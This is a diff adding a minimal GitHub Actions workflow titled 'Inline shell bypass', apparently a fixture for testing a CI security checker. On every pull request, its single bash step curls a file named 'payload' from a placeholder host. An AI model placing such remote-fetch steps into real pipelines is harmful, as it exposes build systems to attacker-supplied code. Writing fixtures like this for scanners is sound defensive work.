@@ -1,0 +1,8 @@
+name: Inline shell bypass
+on: pull_request
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - shell: bash
+        run: curl https://example.invalid/payload
